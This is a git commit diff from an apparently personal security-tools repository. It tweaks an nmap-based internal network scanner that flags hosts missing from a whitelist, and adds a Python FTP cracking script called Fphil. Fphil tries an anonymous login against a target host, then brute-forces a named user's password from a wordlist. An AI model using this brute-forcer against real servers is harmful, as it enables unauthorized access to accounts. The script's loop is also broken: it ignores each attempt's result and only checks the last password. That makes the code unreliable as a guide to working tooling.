9e28ed834b1e05d7842dc55572c79712badcec4b
bitMuch <bitMuch@protonmail.com>
2017-02-22 20:42:07 +0000

    [+] Fphil

--- defensive/intra-scan-kn0wn/kn0wn.py
+++ defensive/intra-scan-kn0wn/kn0wn.py
@@ -1,4 +1,4 @@
-#/usr/bin/python3
+#!/usr/bin/python3
 # Created by c@caine
 # On: 16/02/2017
 # kn0wn: A defensive scanner
@@ -10,21 +10,19 @@ import nmap 		# easy port scan, great for prototyping
 internal_network = '192.168.1.*'		# define inet ip
 whitelist = []					# define list of known ip's
 nm = nmap.PortScanner()				# define global nmap object
-
 # --- Functions --- #
 def scan_init ():
   nm.scan(internal_network, arguments='-F')	# just a fast scan
 
-def load_known ():				# load known hosts \
+def load_known ():				# load known hosts
   global whitelist				# into 'whitelist[]'
   with open('whitelist.txt', 'r') as wl:	
     whitelist = [line.strip(' \n') for line in wl]	
 
 def print_sum ():				# print a summery
-  
-  print('\n')
+  print('=================================================================')
   print('--- Summary Of Scan ---------------------------------------------')
-    
+
   for host in nm.all_hosts():
     print('-----------------------------------------------------------------')
     if host in whitelist:
@@ -32,6 +30,7 @@ def print_sum ():				# print a summery
     else:
       print ('[R]\tUNKNOWN\t%s\t>>>\t%s' % (host, nm[host].hostname()))
   print('-----------------------------------------------------------------')  
+  print('=================================================================')
   print('\n')
 
 def main ():
---
+++ offensive/ftp-crack/Fphil-0.01.py
@@ -0,0 +1,69 @@
+#!/usr/bin/python3
+# Created by c@caine
+# On: 21/02/2017
+# --- Preamble --- #
+from ftplib import FTP
+from sys import argv
+# --- Declarations --- #
+thost = argv[1]
+uname = argv[2]
+wlist = argv[3]
+# --- Functions --- #
+def conn (thost, user, password):
+    try: 
+      f = FTP(thost)
+      f.login(user, password)
+      f.quit()
+      return (1)
+    except:
+      return (0)
+
+def connAnon():
+  print('[+] Trying anonymous credentials for ftp@%s' % thost)
+  if conn(thost, 'anonymous', 'test@test.com'):
+    print('[!] FTP anonymous login successful.\n')
+    print('------------------------------------------------------- [Fphil v-0.01] --')
+    exit(0)
+  else:
+    print('[-] FTP anonymous login failed.')
+
+def connBrute():
+  with open(wlist, 'r') as pwords:
+    print ('[!] Attempting Brute-Force method, in..')
+
+    from time import sleep 
+    count = 3
+    while (count >= 0):
+      print('[%s] Press CTRL-C to Abort' % count)
+      sleep(1)
+      count += -1
+
+    print ('[#] ...\n[#] Trying password list.. This may take a while')
+    for l in pwords.readlines():
+      pword = l.strip('\r' ).strip('\n')
+      try:
+        conn(thost, uname, pword)
+      except:
+        continue
+    if conn(thost, uname, pword):
+      print('[#] ...')
+      print('-------------------------------------------------------------------------')
+      print('[!] FTP login successfull with:\n[>] USER: %s\n[>] PASS: %s\n[.]' % (uname, pword))
+    else:
+      print('[#]')
+      print('-------------------------------------------------------------------------')
+      print('[>] %s\'s password was not found in the list\n[.]' % uname)
+
+def main ():
+  print('-------------------------------------------------------------------------')
+  print('### FTP Pen-Testing/Hacking Infiltration Utility ########################')
+  print('--------------------------------------------------------- [Fphil-0.01] --')
+  print('[*] TARGETING\t ->\tUSER: %s @ HOST: %s' % (uname, thost))
+  print('-------------------------------------------------------------------------')
+  connAnon()
+  print('-------------------------------------------------------------------------')
+  connBrute()
+  print('--------------------------------------------------------- [Fphil-0.01] --')
+# --- Main --- #
+if __name__ == "__main__":
+  main()
